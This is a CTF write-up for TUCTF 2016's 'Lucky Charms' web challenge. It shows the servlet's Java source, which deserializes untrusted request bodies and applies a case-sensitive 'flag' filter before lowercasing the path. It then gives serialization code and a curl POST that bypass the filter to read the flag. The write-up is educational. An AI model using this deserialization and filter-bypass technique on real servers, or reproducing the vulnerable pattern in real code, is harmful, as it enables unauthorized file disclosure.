---
title: 'TUCTF 2016: Lucky Charms (web 150)'
date: 2016-05-14 00:00:00 Z
categories:
- writeup
tags:
- cat/web
- lang/java
layout: post
author: kree
---

* **Category:** web
* **Points:** 150
* **Description:** 

> Nothing like cereal and coffee to start your day!

## Writeup

The given website gives you the following hint in the html source:

```html
<!-- <a href="/?look=LuckyCharms.java"></a> -->
```

This `look` parameter lets to peek into the servlets source code:

```java
abstract class OSFile implements Serializable {
  String file = "";
  abstract String getFileName();
}

class WindowsFile extends OSFile  {
  public String getFileName() {
    //Windows filenames are case-insensitive
    return file.toLowerCase();
  }
}

class UnixFile extends OSFile {
  public String getFileName() {
    //Unix filenames are case-sensitive, don't change
    return file;
  }
}

...

public class NewServlet extends HttpServlet {

  ...

  public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
    doPost(request, response);
  }

  public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
      
      
    response.setContentType("text/html");
    PrintWriter out = response.getWriter();
    
    OSFile osfile = null;
    try {
      osfile = (OSFile) new ObjectInputStream(request.getInputStream()).readObject();
    } catch (Exception e) {
      //Oops, let me help you out there
      osfile = new WindowsFile();
      if (request.getParameter("look") == null) {
        osfile.file = "charms.html";
      } else {
        osfile.file = request.getParameter("look");
      }
    }

    String f = osfile.getFileName().replace("/","").replace("\\","");
    if (f.contains("flag")) {
      //bad hacker!
      out.println("You'll Never Get Me Lucky Charms!");
      return;
    }

    try {
      Path path = Paths.get(getServletContext().getRealPath(f.toLowerCase()));  
      String content = new String(java.nio.file.Files.readAllBytes(path));
      out.println(content);
     } catch (Exception e) {
        out.println(e);
        out.println("Nothing to see here");
     }
  }
  ...
}
```

Basically, we want to use the `look` parameter to extract the content of the file named `flag`. However, there is a check in place that prevents us from spying on the file directly. Our challenge is to get past that check. We notice that the string comparison is case sensitive, but when retrieving the file content, the path string gets transformed to lower case. If we manage `osfile.getFileName()` to return the string `Flag` (or any other String with mixed casing), we should be fine.

If we take another look at the subclasses of OSFile, we notice that the class `WindowsFile` converts its filename to lower case, but `UnixFile` doesn't. For our purpose we would use the latter.

Another observation is the fact that both `http` methods `GET` and `POST` are being handled by `doPost`, but until now we only passed `look` as a `GET` parameter. We need to pass a serialized version of the `OSFile` object with the body of our request. Otherwise we trigger an `EOFException` when invoking `request.getInputStream()` and end up with a `WindowsFile` object.

We can generate a unix object with the following lines:

```java
OSFile unixFile = new UnixFile();
unixFile.file = "Flag";
new ObjectOutputStream(System.out).writeObject(unixFile);
```
We'll store the output in a file and use `curl` to pass the `UnixFile` object over a `POST` request, which yields the flag. 

This challenge was solved by kree and paierlep. 

```
curl 'http://146.148.10.175:1033/LuckyCharms' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Connection: keep-alive' --compressed -X POST --data-binary @object_serialized
```